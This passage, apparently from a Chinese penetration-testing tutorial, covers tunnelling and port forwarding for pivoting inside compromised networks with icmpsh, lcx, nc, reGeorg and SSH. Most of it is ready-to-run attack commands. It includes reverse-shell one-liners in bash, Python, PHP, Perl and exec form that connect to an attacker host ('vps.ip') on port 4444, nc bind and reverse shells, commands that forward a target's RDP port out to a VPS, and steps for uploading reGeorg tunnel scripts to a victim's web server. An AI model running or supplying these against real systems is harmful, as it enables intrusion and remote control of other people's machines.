0x02 网络层




ICMP

网络层中，可以用ICMP和IPv6协议来进行隧道搭建，实现流量转发等。IPv6我自己没用过，是将IPv6数据报文封装在IPv4数据报文中，通过IPv4隧道来传输数据，由于需要配置，而且部分机器还无法正确解析封装了IPv6的IPv4数据包，但是优点就是很多防御机制不会拦截，只推荐几个工具，感兴趣可以试试：socat、nt6tunnel。这里实现一个ICMP隧道：imcpsh工具，项目地址：https://github.com/bdamele/icmpsh


跨平台的工具，我这边直接运行run.sh就可以看到要求我们输入目标的ip地址，之后会返回给我们一个命令，直接在目标机器上执行就可以看到返回的shell。（这里就不去我的shell上执行了，毕竟距离9月1号才过去不久）



0x03 传输层




Lcx

老生常谈的经典端口转发工具，其有Linux和Windows两个版本，但是自己没怎么用过Linux的。（Linux里面叫portmap）。利用自己的服务器简单端口转发举例：
目标机器：Lcx.exe  -slave vps地址  4444  127.0.0.1 3389
将目标机器的3389端口所有数据转发到我们的vps的4444端口。
 
vps机器：lcx.exe  -listen 4444 5555
将vps上的4444端口监听的数据转发到本机的5555端口。
 
如此可以使用vps地址:5555或者在vps上使用127.0.0.1:5555都可访问目标机器的3389远程桌面。


nc

这个工具大家也很熟悉了，Linux和Windows都有这东西，使用效果也很好，这里系统说明一下其简单使用和shell反弹。

简单使用：

抓取Banner信息：nc -nv IP地址 22 (服务的Banner信息可以发现正在运行的服务类型、服务版本)。


端口扫描：nc -v IP地址 80 (前面就说过nc在一些特殊情况下可以用来替代探测端口)。


还可以在这基础上加上-z参数，用来探测目标机器的端口段，比如：nc -v -z ip地址 21-80,不过速度很慢，不咋建议。

 

shell反弹：

正向shell：

攻击机：nc 靶机ip 4444靶机：nc -lvp 4444 -e/bin/sh     Linuxnc -lvp 4444 -ec:\windows\system32\cmd.exe    Windows


反向shell：机器处于内网

攻击机：nc -lvp  4444靶机：nc vps.ip 4444-e /bin/shnc vps.ip 4444 -ec:\windows\system32\cmd.exe


扩展一下其他的反弹shell

bash反弹：bash -i >&/dev/tcp/vps.ip/4444 0>&1
python反弹：python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps.ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
PHP反弹：php -r '$sock=fsockopen("vps.ip",4444);exec("/bin/sh -i<&3 >&3 2>&3");'
perl反弹：perl -e 'useSocket;$i="vps.ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh-i");};'
exec反弹：0<&196;exec 196<>/dev/tcp/vps.ip/4444; sh <&196>&196 2>&196


0x04 应用层




HTTP/HTTPS

通常使用reGeory工具把内网服务器端口数据通过HTTP/HTTPS隧道转发到本机。其支持aspx、php、jsp等脚本，就是其脚本的特征现在很明显，很多杀软都过不了，不过配合前面的工具使用还是没有问题的。（reg的使用需要目标服务器有web服务，frp就没这个要求）下载地址https://github.com/sensepost/reGeorg。


使用相应的脚本文件上传到靶机上，然后本地访问其上传的目标文件公网地址，再在本地利用脚本监听端口，即可建立通信：
python reGeorgSocksProxy.py -p 8888 -u http://test/tunnel.jsp

 

注意：再配合proxifier或SocksCap等代理工具选择SOCKS5类型代理，使用proxifier代理时将python放行，不然会死循环。


SSH

简单的ssh命令：

ssh root@121.43.167.23



本地转发：

ssh -CfNg  -L (vps端口):(目标主机):(目标端口)  root@跳板机IP（一般是拿下的内网服务机器，web等）


远程转发：

ssh -CfNg  -R (vps端口):(目标主机):(目标端口)  root@跳板机IP（一般是拿下的内网服务机器，web等）


动态转发：

ssh  -CfNg -D 2222 root@跳板机IP  （动态端口映射就是建立一个ssh加密的socks4/5代理通道进行代理访问）
